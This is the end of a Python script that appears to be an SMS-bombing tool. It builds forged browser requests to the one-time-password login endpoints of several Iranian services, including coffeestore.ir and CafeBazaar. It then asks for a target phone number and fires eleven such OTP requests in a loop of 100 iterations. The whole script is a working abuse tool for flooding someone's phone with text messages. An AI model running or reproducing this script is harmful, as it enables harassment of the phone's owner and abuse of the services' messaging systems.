    'action': 'digits_forms_ajax',
    'type': 'login',
    'digits_step_1_type': '',
    'digits_step_1_value': '',
    'digits_step_2_type': '',
    'digits_step_2_value': '',
    'digits_step_3_type': '',
    'digits_step_3_value': '',
    'digits_login_email_token': '',
    'digits_redirect_page': '//coffeestore.ir/',
    'digits_form': 'a05260f5f7',
    '_wp_http_referer': '/',
    'show_force_title': '1',
    'container': 'digits_protected',
    'sub_action': 'sms_otp',
}

    response = requests.post('https://coffeestore.ir/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
def bazar(phone):
    headers = {
    'authority': 'api.cafebazaar.ir',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://cafebazaar.ir',
    'referer': 'https://cafebazaar.ir/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
}

    json_data = {
    'properties': {
        'language': 2,
        'clientID': 'r1pud8e2sfdbiuk8xwpn5q0ua6qfg26r',
        'deviceID': 'r1pud8e2sfdbiuk8xwpn5q0ua6qfg26r',
        'clientVersion': 'web',
    },
    'singleRequest': {
        'getOtpTokenRequest': {
            'username': phone,
        },
    },
}

    response = requests.post('https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest', headers=headers, json=json_data)


if __name__ == '__main__': #e.x : 9012330071
    phone = input("enter your mobail phone without first 0 : ")

for _ in range(100):
    try:
        snapp(phone)
        digikala(phone)
        adak(phone)
        kalatik(phone)
        torob(phone)
        lioncomputer(phone)
        technolife(phone)
        baslam(phone)
        digipay(phone)
        coffestore(phone)
        bazar(phone)
    except Exception as e:
        print(f"An error occurred: {e}")
